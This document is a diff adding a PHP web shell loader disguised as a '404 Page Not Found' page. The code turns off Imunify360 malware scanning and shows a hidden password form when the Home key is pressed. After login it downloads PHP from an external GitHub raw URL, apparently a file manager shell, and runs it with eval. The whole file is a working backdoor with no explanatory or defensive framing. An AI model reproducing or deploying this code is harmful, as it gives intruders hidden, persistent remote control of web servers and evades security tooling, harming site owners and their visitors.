@@ -1,0 +1,170 @@
+<?php
+// Initialize global environment and load system files
+session_start();
+error_reporting(E_ALL);  // Change from 0 to E_ALL for more detailed error reporting
+define('SECURE_ACCESS', true);
+header('X-Powered-By: none');
+header('Content-Type: text/html; charset=UTF-8');
+
+// Disable unnecessary features (as you have in your code)
+ini_set('lsapi_backend_off', '1');
+ini_set("imunify360.cleanup_on_restore", false);
+ini_set("imunify360.enabled", false);
+ini_set("imunify360.antimalware", false);
+ini_set("imunify360.realtime_protection", false);
+
+function geturlsinfo($url) {
+    $url_get_contents_data = false;
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        if (isset($_SESSION['SAP'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
+        }
+
+        $url_get_contents_data = curl_exec($conn);
+        if (curl_errno($conn)) {
+            echo 'Curl error: ' . curl_error($conn);
+        }
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    }
+
+    if ($url_get_contents_data === false) {
+        echo "Error fetching the URL content.";
+    }
+    return $url_get_contents_data;
+}
+
+function is_logged_in() {
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+if (isset($_POST['password'])) {
+    $entered_password = $_POST['password'];
+    $hashed_password = '$2a$12$pCo03YO/datYAq8jKH0Dm.v8GU.Dc.BxEGNq/r5UxQw9Z3CSh8EOG';
+    if (password_verify($entered_password, $hashed_password)) {
+        $_SESSION['logged_in'] = true;
+        $_SESSION['SAP'] = 'biadap';
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        echo "Incorrect password. Please try again.";
+    }
+}
+
+if (is_logged_in()) {
+    // Fetch URL content and handle the response
+    $a = geturlsinfo('https://raw.githubusercontent.com/exgcly/kitabisacom1337/refs/heads/main/fm1337.php');
+    if ($a !== false) {
+        eval('?>' . $a);  // Execute the fetched code
+    } else {
+        echo "Failed to fetch or execute the URL content.";
+    }
+} else {
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>404 Page Not Found</title>
+        <style type="text/css">
+            ::selection { background-color: #E13300; color: white; }
+            ::-moz-selection { background-color: #E13300; color: white; }
+
+            body {
+                background-color: #fff;
+                margin: 40px;
+                font: 13px/20px normal Helvetica, Arial, sans-serif;
+                color: #4F5155;
+            }
+
+            a {
+                color: #003399;
+                background-color: transparent;
+                font-weight: normal;
+            }
+
+            h1 {
+                color: #444;
+                background-color: transparent;
+                border-bottom: 1px solid #D0D0D0;
+                font-size: 19px;
+                font-weight: normal;
+                margin: 0 0 14px 0;
+                padding: 14px 15px 10px 15px;
+            }
+
+            code {
+                font-family: Consolas, Monaco, Courier New, Courier, monospace;
+                font-size: 12px;
+                background-color: #f9f9f9;
+                border: 1px solid #D0D0D0;
+                color: #002166;
+                display: block;
+                margin: 14px 0 14px 0;
+                padding: 12px 10px 12px 10px;
+            }
+
+            #container {
+                margin: 10px;
+                border: 1px solid #D0D0D0;
+                box-shadow: 0 0 8px #D0D0D0;
+            }
+
+            p {
+                margin: 12px 15px 12px 15px;
+            }
+
+            .hidden-form {
+                display: none; 
+                text-align: center;
+                margin-top: 20px;
+            }
+
+            .hidden-form input {
+                padding: 10px;
+                font-size: 16px;
+                margin: 5px 0;
+            }
+
+            .hidden-form button {
+                padding: 10px;
+                font-size: 16px;
+                cursor: pointer;
+            }
+        </style>
+    </head>
+    <body>
+        <div id="container">
+            <h1>404 Page Not Found</h1>
+            <p>The page you requested was not found.</p>
+        </div>
+
+        <form class="hidden-form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" id="loginForm">
+            <input type="password" name="password" id="password" placeholder="Enter password" required>
+            <button type="submit">Login</button>
+        </form>
+
+        <script>
+            document.addEventListener('keydown', function(event) {
+                if (event.key === 'Home') { 
+                    document.querySelector('.hidden-form').style.display = 'block';
+                }
+            });
+        </script>
+
+    </body>
+    </html>
+    <?php
+}
+?>
